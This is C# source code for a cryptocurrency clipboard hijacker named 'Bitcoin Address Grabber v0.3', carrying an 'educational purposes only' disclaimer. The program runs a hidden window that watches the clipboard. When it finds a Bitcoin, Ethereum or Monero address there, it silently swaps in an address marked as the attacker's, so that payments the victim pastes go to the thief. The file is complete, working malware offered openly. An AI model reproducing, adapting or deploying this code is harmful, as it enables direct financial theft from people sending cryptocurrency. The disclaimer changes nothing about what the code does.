using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text.RegularExpressions;

/*
 * │ Author       : NYAN CAT
 * │ Name         : Bitcoin Address Grabber v0.3
 * │ Contact      : https:github.com/NYAN-x-CAT
 * 
 * This program Is distributed for educational purposes only.
 */

namespace Bitcoin_Grabber
{
    public class Program
    {
        public static void Main()
        {
            new Thread(() => { Application.Run(new ClipboardNotification.NotificationForm()); }).Start();
        }
    }

    internal static class NativeMethods
    {
        //https://stackoverflow.com/questions/17762037/error-while-trying-to-copy-string-to-clipboard
        //https://gist.github.com/glombard/7986317

        public const int WM_CLIPBOARDUPDATE = 0x031D;
        public static IntPtr HWND_MESSAGE = new IntPtr(-3);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }

    public static class Clipboard
    {
        public static string GetText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }

        public static void SetText(string txt)
        {
            Thread STAThread = new Thread(
                delegate ()
                {
                    System.Windows.Forms.Clipboard.SetText(txt);
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
        }
    }

    public sealed class ClipboardNotification
    {
        public class NotificationForm : Form
        {
            public NotificationForm()
            {
                NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
                NativeMethods.AddClipboardFormatListener(Handle);
            }

            protected override void WndProc(ref Message m)
            {
                if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                {
                    string currentClipboard = Clipboard.GetText();

                    string btcReplacement = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw"; //attacker's btc address
                    Regex btcPattern = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b"); //btc

                    string ethereumReplacement = "Ethereum"; //attacker's eth address
                    Regex ethereumPattern = new Regex(@"\b0x[a-fA-F0-9]{40}\b"); //ethereum

                    string xmrReplacement = "XMR"; //attacker's xmr address
                    Regex xmrPattern = new Regex(@"\b4([0-9]|[A-B])(.){93}\b"); //xmr

                    if (btcPattern.Match(currentClipboard).Success && !currentClipboard.Contains(btcReplacement))
                    {
                        string result = btcPattern.Replace(currentClipboard, btcReplacement);
                        Clipboard.SetText(result);
                    }
                    if (ethereumPattern.Match(currentClipboard).Success && !currentClipboard.Contains(ethereumReplacement))
                    {
                        string result = ethereumPattern.Replace(currentClipboard, ethereumReplacement);
                        Clipboard.SetText(result);
                    }
                    if (xmrPattern.Match(currentClipboard).Success && !currentClipboard.Contains(xmrReplacement))
                    {
                        string result = xmrPattern.Replace(currentClipboard, xmrReplacement);
                        Clipboard.SetText(result);
                    }
                }
                base.WndProc(ref m);
            }
        }

    }
}